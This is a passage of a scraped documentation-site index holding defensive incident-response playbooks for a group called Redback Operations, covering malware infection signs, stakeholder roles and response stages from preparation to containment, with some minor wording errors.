malicious malware, which gives attackers access to infected computers without permission.  Signs of Trojan Infection:  Suspicious applications or processes running in the background.Unusual changes made to files or system settings by Trojan payloads.Remote attackers gaining unlawful access to private information or system resources.Unexpected toolbar or programme installation on compromised computers.Abnormalities in the way the system operates, including sluggishness or frequent crashes.  ","version":"Next","tagName":"h3"},{"title":"2.3 Ransomware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#23-ransomware","content":" Ransomware encrypts files or prevents users from accessing their computers, and then demands a fee to unlock the system or restore access.  Signs of Ransomware Activity:  Files that are inaccessible and have a.locky or.crypt file extension are encrypted.Appearance of warning messages or ransom notes requesting money to unlock files.Alteration of file dates or properties through the encryption procedures of ransomware.Unusual patterns of network traffic as the ransomware talks to the servers that govern it.Existence on compromised systems of ransomware-related artefacts, such as executables or registry entries.  ","version":"Next","tagName":"h3"},{"title":"2.4 Botnets​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#24-botnets","content":" Botnets are networks of infected devices under the control of hackers, frequently employed to carry out coordinated assaults or disseminate malware payloads.  Signs of Botnet Infection:  Strange outgoing network connections to command-and-control sites made by compromised devices.Large amounts of harmful or spam emails coming from infected computers.Botnet activity on compromised devices is causing high CPU or bandwidth utilisation.The existence of backdoor trojans or remote access programmes that facilitate botnet communication.Unexpected alterations in system behaviour or performance brought on by botnet activity.  ","version":"Next","tagName":"h3"},{"title":"2.5 Spyware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#25-spyware","content":" Without user agreement, spyware secretly records private user data, gathers it, and sends it to hostile parties.  Signs of Spyware Presence:  Unexpected adjustments to the homepage or default search engine in a browser.Display of inappropriate pop-up advertisements or browser reroutes to unsafe websites.Existence of toolbars or unusual browser extensions that have been installed without permission.Spyware activity might cause a slow internet connection or poor browser performance.Criminals gaining illegal access to passwords, surfing history, or sensitive information.  ","version":"Next","tagName":"h3"},{"title":"2.6 Adware​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#26-adware","content":" Without the user's permission, adware gathers user data for targeted advertising, displays invasive adverts, and reroutes web traffic.  Signs of Adware Infection:  Sudden emergence of unwelcome pop-up advertising or banners when browsing the internet.Redirects users who click on links or search results to dubious or harmful websites.Adware processes causing slow browser speed or frequent crashes.Altering the main page or preferred search engine in a browser without permission.Data, database entries, or browser extensions connected to adware being present on compromised machines.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#3-stakeholders","content":" Many stakeholders both inside and outside the company must work together and coordinate their efforts to effectively respond to malware outbreaks. In the incident response process, the following parties are crucial:  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#31-it-security-team","content":" The IT security team oversees protecting the company's digital assets, identifying security risks, and putting preventative and corrective measures in place for data breaches. Among their duties and functions are:  Examining security event analysis to evaluate malware outbreaks' effect and extent. Putting security measures in place to stop more illegal access and stop viruses from spreading. Working together with the incident response team to control malware outbreaks and reduce their effect. Carrying out forensic investigation to find the underlying cause of Malware problems and stop them from happening again. Advising on incident response protocols and suggesting security improvements to high management and other stakeholders.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#32-incident-response-team","content":" The incident response team is responsible for organising cleanup activities and overseeing the organization's reaction to malware outbreaks. Among their duties and functions are:  Determining the scope and gravity of malware outbreaks and carrying out the required corrective measures. Assembling staff and resources to limit and lessen the effects of malware attacks. Conducting forensic investigations to ascertain the cause and extent of malware outbreaks and collect data for prospective court cases. Communicating incident response protocols and recovery efforts to stakeholders, including top management, outside contractors, and consumers. Enhancing the organization's incident response capacity by recording best practices and lessons discovered from malware events.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#33-communication-team","content":" The communication team oversees overseeing and guaranteeing clear and consistent message for both internal and external communications about malware outbreaks. Among their duties and functions are:  Creating and implementing communication plans to alert stakeholders about malware outbreaks, such as staff members, clients, and outside vendors. Drafting and distributing communication documents to answer queries and concerns from stakeholders, such as press releases, statements, and FAQs. Launching media relations and public relations initiatives to safeguard the organization's image and lessen the damaging effects of malware outbreaks. Giving the incident response team and senior leadership frequent information on stakeholder involvement and interaction initiatives.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#34-customers","content":" Clients are people or groups that have a stake in the goods or services that the company provides and who could be impacted by malware outbreaks. Among their duties and functions are:  Notifying the company of any unauthorised or questionable conduct pertaining to their accounts or transactions. Supplying the incident response team with pertinent data or proof to aid in the investigation of malware outbreaks. Following the advice and directives of the organisation on safeguarding their personal information and lessening the effects of virus outbreaks.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside businesses that supply the company with goods, services, or support; they may also have access to its systems, networks, or data. Among their duties and functions are:  Working along with the company's incident response team to find and fix security flaws or breaches pertaining to their goods or services. Providing help and backing to the company as it investigates and resolves malware problems impacting its systems or networks. Meeting legal and contractual standards for data security and privacy, including reporting security breaches, and supporting incident response activities.  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: To begin incident response preparations, the incident response team is notified as soon as a malware outbreak is discovered.  Identification (Identify): Red  Contain the Outbreak; Isolate Affected Systems: To stop more unauthorised access, steps are made to isolate compromised systems and limit the outbreak.  Notification (Notif): Violet  Change Credentials; Perform Malware Scan: To mitigate the effect of the outbreak, malware scans and password changes are made.Analyse Malicious Activities; Notify Stakeholders: Malicious activity is found through additional analysis, and stakeholders are informed to plan reaction actions.  Containment (Contain): Sky Blue  Error - Unable to Isolate; Escalate to Senior Management: Senior management is notified of the issue for resolution if the impacted systems cannot be isolated.  Eradication (Erad): Light Green  Document Incident Details; Eradicate Malware: To remove the danger, malware removal processes are carried out and incident facts are logged.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: To restore regular operations, recovery steps are started, and ongoing monitoring is carried out for any new malware activity.  Post-Incident Actions (Post): Light pink  Continue Monitoring for Threats; Conduct Post-Incident Review: In addition to ongoing threat detection, a post-event evaluation is carried out to assess the response's efficacy and pinpoint areas in need of development.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#51-preparation","content":" Objective: Establishing the policies, procedures, and assets necessary to effectively manage malware outbreaks is the primary objective of the preparation stage. Activities: Assembling an incident response team with distinct responsibilities.Developing crisis response procedures and plans that incorporate communication protocols and escalation pathways.Ensuring readiness by regularly training and practicing incident responses.Putting in place surveillance systems and security measures to find and stop malware outbreaks. Outcome: A fully prepared business with the ability to respond quickly and effectively to malware outbreaks.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#52-detection","content":" Objective: The goal of the detection stage is to look for indications of malware outbreaks or illegal access to the networks and systems of the company. Activities: Keeping an eye out for questionable activity, such strange access patterns, or illegal file transfers, by examining system records and network traffic.Using intrusion detection systems (IDS) and security information and event management (SIEM) tools to find any assaults.Examining anomalies and alerts to distinguish between dangerous and acceptable activity. Outcome: Early malware outbreak identification enables rapid reaction and mitigation measures.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#53-analysis","content":" Objective: Finding out and understanding the nature and scope of the malware epidemic occurrence are the main goals of the analysis stage. Activities: Collecting data and using forensic analysis to identify the source and extent of the malware infestation.Analysing systems and networks that have been compromised to determine attack tactics and the effects on compromised data.Identifying the indications of compromise (IOCs) and strategies, methods, and procedures (TTPs) of threat actors. Outcome: A comprehensive comprehension of the malware outbreak, considering the causes, effects, and attribution of the outbreak.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#54-containment","content":" Objective: The containment stage stops future unauthorised access or leakage of information to mitigate the effect and spread of the event. Activities: Dividing vulnerable computers and networks to stop attackers from spreading laterally.Putting in place safeguards and access limits to stop illegal access to private data.Containing or obstructing dangerous software, data, or network traffic to stop more harm. Outcome: Effective handling of the malware breakout incident, minimising the harm done to the organization's data and systems.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#55-eradication","content":" Objective: The goal of the eradication phase is to eliminate the attackers from the company's networks and IT infrastructure, along with any hazards or vulnerabilities that may still exist. Activities: Eradicating bad software and data and returning hacked machines to a safe configuration.Repairing or updating software and systems that are susceptible to attack to stop future exploitation.Examining and amending security procedures and policies to fix any vulnerabilities or faults found. Outcome: Removing all traces of the malware breakout event and cutting down on vulnerabilities to stop future occurrences of this kind.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#56-recovery","content":" Objective: The goal of the recovery stage is to get the affected systems and data back to normal and to start doing business as usual. Activities: Restoring corrupted systems as well as information backups to guarantee information accessibility and integrity.Rebuilding or rearranging systems and networks to improve security and stop such incidents in the future.Putting in place initiatives for user awareness and education to stop malware outbreaks in the future. Outcome: Complete recovery of services and operations, along with stronger safety protocols to reduce the probability of a repeat.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post- Incident Review​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#57-post--incident-review","content":" Objective: The company assesses its reaction to the malware outbreak issue during the post-incident assessment phase, looking for areas for improvements and lessons learnt. Activities: Completing a thorough analysis of the incident response procedure, considering its advantages, disadvantages, and potential areas of development.Recording best practices and lessons discovered to improve future incident response capabilities.Modifying incident response procedures, policies, and security setups considering the review's conclusions. Outcome: Enhancing incident response skills and preparing for any malware outbreaks in the future.  ","version":"Next","tagName":"h3"},{"title":"6. Terminology​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#6-terminology","content":" Malware Outbreak: A circumstance in which malicious software quickly spreads throughout the computers, networks, or devices of a company, usually with the goal of stealing, disrupting, or infiltrating data. Indicators of Compromise (IOCs): Indications of potentially harmful activity that may be seen in an organization's IT infrastructure and that point to the existence of malware, or a security breech connected to the outbreak. Incident Response: A methodical and structured process for locating, controlling, and lessening the damage that a malware outbreak does to an organization's IT infrastructure to reduce interruption and get things back to normal. Forensic Analysis: The careful inspection and evaluation of digital evidence associated with the malware outbreak, including system artefacts, malware samples, and network logs, to determine the origin of the attack, gauge its scope, and provide proof for legal or investigative needs. Security Controls: Defensive measures and protections, including as firewalls, antivirus software, intrusion detection systems (IDS), and endpoint protection solutions, put in place to identify, stop, and reduce the impact of a malware outbreak. Vulnerability: Vulnerabilities or holes in a company's networks, apps, or IT systems that might be used by malware to propagate, get improper access, or do damage. Preventing and managing malware outbreaks requires the identification and patching of vulnerabilities. Phishing: A popular attack vector that hackers employ to fool people into disclosing private information, including passwords, usernames, and financial information. This is frequently done through fake emails, websites, or texts. Phishing assaults have the potential to spread malware and start an outbreak of the infection inside a company. ","version":"Next","tagName":"h2"},{"title":"PDF Files (Downloads)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/PDF Files","content":"Last updated by: buvan008, Last updated on: '08/09/2024' Last updated by: buvan008, Last updated on: '08/09/2024' PDF Files (Downloads) Incident Response Playbooks Find below the documents referenced in the Playbooks page. Phishing Incident Response Playbook v2Denial of Service Incident Response PlaybookData Theft Incident Response PlaybookMalware Outbreak Incident Response PlaybookVirus Outbreak Incident Response Playbook","keywords":"","version":"Next"},{"title":"Redback Operations General Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#11-overview","content":" In today's connected digital environment, the risk of cyber security breaches is high for organizations of all sizes and industries. Redback Operations, like many others, operates in an environment where potential security breaches and disruptions are a constant concern. Whether it's a sophisticated cyber-attack triggered by external threats, or an unintentional data leak caused by the carelessness of insiders, the consequences of a security breach can be severe, from financial loss to reputational damage.Because these challenges must be faced, the Redback Operation Recovery Playbook has been carefully crafted as a comprehensive guide to navigating the complex landscape of incident response and recovery. The manual is primarily designed to equip Redback Operations with the tools, strategies, and best practices needed to effectively restore systems,data, and operations after a security breach. By creating a structured framework for response and recovery efforts, the manual aims to empower Redback Operations to mitigate the impact of incidents, minimize downtime and protect against future threats.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#12-purpose","content":" The Redback Operation Recovery Playbook has one purpose at its heart: to create a unified and coordinated approach to recovery operations. As events unfold and disrupt normal operations, the playbook acts as a guiding beacon, providing clear instructions and actionable steps to help you navigate the turbulent waters of disruption. Its overall goal is to ensure that Redback Operations are well prepared to weather the storm of security breaches and, on the other hand, stronger and more resilient.  The combination of proactive measures and reactive strategies aims to equip Redback Operations with the necessary flexibility to withstand and recover from various security incidents. Whether it's a targeted cyber-attack to steal sensitive data or a system failure that threatens to shut down operations, the guide provides a response and recovery plan that is both robust and adaptive.  ","version":"Next","tagName":"h3"},{"title":"1.3 Definition of Attack​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#13-definition-of-attack","content":" In the context of the Redback Operation Recovery Manual, the term &quot;attack&quot; includes a broad spectrum of malicious actions that threaten the security, integrity or availability of Redback's systems and networks. . or data. The guidance recognizes the multifaceted nature of security breaches, from intentional actions by external threat actors attempting to exploit vulnerabilities to inadvertent errors by internal users who inadvertently expose sensitive information. By adopting a broad definition of attacks, the playbook ensures that response efforts are not limited to traditional cyber threat concepts, but instead target the various risks that Redback Operations face. This comprehensive approach enables a more holistic understanding of security incidents and empowers response teams to effectively address all threats, whether they originate from within or outside the organization.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#14-scope","content":" The scope of the Redback Operation Recovery Playbook is intentionally broad to cover all types of security incidents and disruptions that affect Redback operations. This includes, but is not limited to, events resulting from malicious activity such as cyber-attacks, data breaches and phishing attempts, as well as non-malicious events such as system failures, natural disasters, and human error. By casting a wide net, the playbook ensures that narrow definitions or biases do not limit security response efforts. Instead, it considers the complexity and unpredictability of today's threat landscape and recognizes that security breaches can manifest in many forms and require a flexible and adaptive response.  Basically, the introduction provides a comprehensive overview of the Redback Operation Recovery Playbook, outlining its purpose, scope, and approach to handling security incidents. It sets the scene for the rest of the document and sets the stage for the detailed strategies and procedures that follow.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#21-insider-threat","content":" Insider threats are of particular concern to Redback because people within an organization can misuse their access rights to compromise security, integrity, or availability of Redback's systems, networks, or data. These individuals may include employees, contractors, or other trusted entities that pose a serious threat to the organization's cybersecurity posture. Insider threats come in many forms, including unauthorized access to confidential information, data breaches, obstruction, and negligence. For example, employees can directly access Redback systems and abuse their rights to steal confidential data for personal gain or inadvertently reveal confidential information by tampering with company assets. Detecting and mitigating insider threats requires a multi-layered approach that includes implementing strong access controls, monitoring user activity, and conducting regular security briefings, and creating a culture of accountability and trust within the organization.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attacks​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#22-external-attacks","content":" External attacks against Redback originate from threat actors outside the organization's domain, including followers, Internet critics, and domestic actors. These attackers often exploit vulnerabilities in Redback's systems, networks, or applications to gain unauthorized access, steal sensitive information, or disrupt operations. External attacks come in many forms, including phishing attacks, malware, denial-of-service (DoS) attacks, and exploiting software vulnerabilities. For example, attackers could launch sophisticated cyberattacks on Redback's network infrastructure, using untouched software vulnerabilities to access sensitive data or disrupt critical business operations. Protecting against external attacks requires a proactive, multifaceted approach, including implementing cybersecurity controls, conducting regular vulnerability assessments, monitoring suspicious activity, and using threat intelligence to identify and mitigate emerging threats.  ","version":"Next","tagName":"h3"},{"title":"2.3 Data Breach​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#23-data-breach","content":" Data breaches are a serious threat to Redback's security posture due to the unauthorized access, deletion, or disclosure of sensitive or confidential information. These breaches can occur from multiple attack vectors, including external attacks, insider threats, and accidental data exposure. A data breach can have serious consequences for Redback, including financial loss, reputational damage, legal penalties, and loss of customer trust. For example, cybercriminals could exploit vulnerabilities in Redback's network infrastructure to gain unauthorized access to customer databases and steal sensitive information such as personally identifiable information (PII), payment card data, inventory, or mind. Preventing and mitigating data breaches requires a multilayered approach, including implementing strong access controls, encrypting sensitive data, monitoring for unauthorized access, conducting regular security audits, and adhering to regulatory compliance requirements such as GDPR or CCPA.  ","version":"Next","tagName":"h3"},{"title":"2.4 Phishing Attacks​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#24-phishing-attacks","content":" Phishing attacks are a prevalent form of cyber threat that targets individuals within Redback through deceptive tactics, such as fraudulent emails, messages, or websites, with the goal of tricking recipients into divulging sensitive information or performing malicious actions. These attacks often impersonate legitimate entities, such as Redback's employees, customers, or business partners, to gain the trust of unsuspecting victims. Phishing attacks can take various forms, including email phishing, spear phishing, or social media phishing, and may involve enticing recipients to click on malicious links, download malwareinfected attachments, or enter login credentials into fraudulent websites. For example, a cybercriminal may send a phishing email to Redback's employees, posing as the IT department and requesting them to reset their passwords by clicking on a malicious link, thereby compromising their credentials, and gaining unauthorized access to Redback's systems. Preventing phishing attacks requires a combination of user education and awareness training with technical capabilities, such as email filtering, web content analysis, and endpoint protection, to help people recognize and report phishing attempts.  ","version":"Next","tagName":"h3"},{"title":"2.5 Ransomware Attack​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#25-ransomware-attack","content":" Ransomware attacks are a serious threat to Redback's operations by distributing malicious software that encrypts files or systems and makes them inaccessible until payment is made. striker These attacks can cause damage to Redback, including data loss, financial damage, organizational disruption, and reputational damage. Ransomware attacks can be delivered through various methods, including email phishing, packet exploits, and remote desktop protocol (RDP) vulnerabilities, which can target endpoints, servers, and Redback network infrastructure. For example, cybercriminals can distribute ransomware to Redback employees using phishing emails with malicious attachments. Once opened, the attachment encrypts files on the victim's device and demands a ransom in exchange for the decryption key. Preventing ransomware attacks requires a multi-layered approach, including implementing end-to-end security measures, backing up sensitive data, patching known vulnerabilities, and segmenting networks to prevent the spread of ransomware and staff training on ransomware risks and best practices. epidemic  ","version":"Next","tagName":"h3"},{"title":"2.6 Credential Theft​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#26-credential-theft","content":" Unauthorized removal or misuse of login credentials, such as usernames and passwords, to access a secure Redback State site. Systems, applications, or sensitive information. These credentials can be obtained in several ways, including phishing attacks, hacking techniques, or exploiting vulnerabilities in the authentication method. Identitytheft allows attackers to impersonate legitimate users, bypass security controls, and gain unauthorized access to Redback resources. For example, cybercriminals can use stolen credentials to log into the Redback employee portal and download sensitive. data or initiate fraudulent activities. To prevent information theft, you should implement strong authentication methods, including multifactor authentication MFA,password management policies, and user training to educate employees on the importance of protecting their symptoms and being aware of potential threats.  Basically, Redback Operations implements cybersecurity measures and enforces security to stay alert against all types of attacks, including insider threats, external attacks, data breaches, phishing attacks, ransomware attacks, and theft to stay on top of day. Aculture of security awareness throughout the organization.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#3-stakeholders","content":" The proficient handling and settlement of incidents require the coordinated endeavours and cooperation of a heterogeneous group of stakeholders, each possessing distinct knowledge, viewpoints, and roles. The following parties are essential to the incident response process, from frontline responders entrusted with containment and mitigation to senior leadership tasked with making strategic decisions:  IT Security Team: Redback Operations' IT Security Team is a key element of incident response, spearheading the technical efforts to locate, investigate, and resolve problems involving improper usage. This team oversees monitoring system and network logs, doing forensic investigation, and implementing security procedures to prevent such incidents in the future. They work together with other relevant parties to guarantee a coordinated and effective response to instances of inappropriate usage, minimising the impact on Redback's operations and data protection.Incident Response Team: The cross-functional incident response team at Redback Operations is made up of representatives from the management, IT, security, and legal departments. This group is responsible for planning incident response actions, communicating with pertinent stakeholders, and making critical decisions to contain and handle instances of inappropriate use. They ensure that incident response operations adhere to Redback's policies, procedures, and legal obligations, fostering a cohesive and efficient response.Legal and Compliance Department The management, IT, security, and legal departments are represented on Redback Operations' cross-functional incident response team. To contain and manage cases of inappropriate use, this group oversees organising incident response actions, corresponding with relevant parties, and making crucial decisions. To promote a coordinated and effective reaction, they make sure that incident response activities follow Redback's rules, processes, and legal duties.System Administrators: Root access concerns are largely identified, investigated, and resolved by system administrators, who operate as stewards of organisational systems and networks, using their technical expertise and domain experience to restore system integrity and performance.Management: Setting organisational priorities, allocating resources, and spearheading strategic efforts aimed at bolstering the organization's resilience against root access threats are all crucial tasks performed by executive leadership, which includes C-suite executives and senior management.External Consultants: Organisations may hire outside consultants or third-party vendors to supplement their incident response capabilities in situations requiring specific knowledge or resources. These vendors can help with forensic analysis, threat intelligence, and remediation efforts.  ","version":"Next","tagName":"h2"},{"title":"4. Flow Chart​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#4-flow-chart","content":"   Preparation Stage (Yellow):  This phase involves the first steps in becoming ready to handle any issue that may arise with Redback's systems.Establishing the incident response team, creating crisis response protocols, running training sessions and simulations, and putting security and surveillance technologies in place are important tasks.The necessity of readiness and preparation for the efficient handling of situations is symbolised by the colour yellow.  Detection Stage (Red):  Identifying signs of inappropriate use or illegal access to Redback's systems and resources is the main goal at this point.Using intrusion detection systems (IDS) and security information and event management (SIEM) technologies, keeping an eye out for suspicious activity, and examining anomalies and warnings are some of the actions involved.Red is a symbol for the urgency and importance of event detection to provide quick mitigation and response actions.  Analysis Stage (Violet):  This stage entails determining the type and extent of the incident that has been discovered.Data collection, forensic analysis, system and network analysis, threat actor strategies, and indicator of compromise (IOC) identification are among the activities involved.The colour violet represents the necessity for a careful investigation to ascertain the incident's causes, consequences, and authorship.  Containment Stage (Sky Blue):  At this point, measures are being done to lessen the incident's impact and stop more unauthorised access or data leaks.To contain or prevent harmful software or data, segregate susceptible systems, put access restrictions in place, and, if containment fails, escalate to senior management.The containment strategies intended to lessen the incident's impact and spread are symbolised by the colour sky blue.  Eradication Stage (Light Green):  This phase concentrates on eliminating attackers from Redback's networks and infrastructure and resolving any risks or vulnerabilities that may still exist after the event has been controlled.Among the tasks include deleting illegal software and data, patching, or upgrading weak systems, and examining and revising security guidelines and protocols.The activity of eliminating the event and guaranteeing the security of the organization's systems is represented by the colour light green.  Recovery Stage (Pink):  Restoring impacted systems and data to normal functioning and continuing company operations are the goals of the recovery stage.Rebuilding or reconfiguring networks and systems, recovering corrupted systems and data backups, and putting user awareness and education programmes into action are among the tasks.The process of recuperating from the catastrophe and improving security procedures to lessen the possibility of a recurrence is symbolised by the colour pink.  Post-Incident Review Stage (Brown):  Post-incident activities are carried out in the last step to assess the organization's reaction to the incident and pinpoint areas that require improvement.The process of responding to incidents is thoroughly analysed, best practices and lessons gained are documented, and incident response protocols, rules, and security configurations are updated, among other tasks.The post-event initiatives intended to improve future response efforts and learn from the occurrence are represented by the colour brown.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages  ​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"1. Preparation​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#1-preparation","content":" Objective: Putting in place the guidelines, practices, and tools required to handle issues in Redback's systems.Activities:Putting together a team for incident response with clear roles and duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Holding practice sessions and exercises on a regular basis to guarantee readiness and rehearse incident response protocols.Putting in place security measures and surveillance systems to find and stop events.Outcome: A well-equipped company with the ability to react to situations quickly and efficiently.  ","version":"Next","tagName":"h3"},{"title":"2. Detection​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#2-detection","content":" Objective: Recognising warning signs of illegal access to Redback's resources and systems.Activities:Keeping an eye out for questionable activity, such as odd access patterns or unauthorised attempts at authentication.**Using security information and event management (SIEM) and intrusion detection systems (IDS) to find such problems.**Examining abnormalities and warnings to distinguish between authorised and unauthorised activity.**Outcome: Rapid reaction times and mitigating actions are made possible by early event detection.  ","version":"Next","tagName":"h3"},{"title":"3. Analysis​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#3-analysis","content":" Objective: Recognising the type and extent of the incident that occurred. Activities: Gathering information and carrying out forensic investigation to ascertain the origin and degree of the illegal entry.** Examining hacked networks and systems to find attack vectors and how they affect compromised data. Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs). Outcome: A thorough comprehension of the event, considering its causes, consequences, and attributions.  ","version":"Next","tagName":"h3"},{"title":"4. Containment​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Redback Operations General Incident Response Playbook#4-containment","content":" Objective: Limiting the spread and effects of the incident and stopping any illegal access or data leaks.**Activities:Dividing up susceptible networks and systems to stop intruders from moving laterally.**Putting safety measures and access restrictions in place to stop illegal access to sensitive data.**Limiting or preventing harmful data, software, or network flow to stop more damage.**Outcome: Efficient handling of the situation to reduce harm to Redback's systems and data.  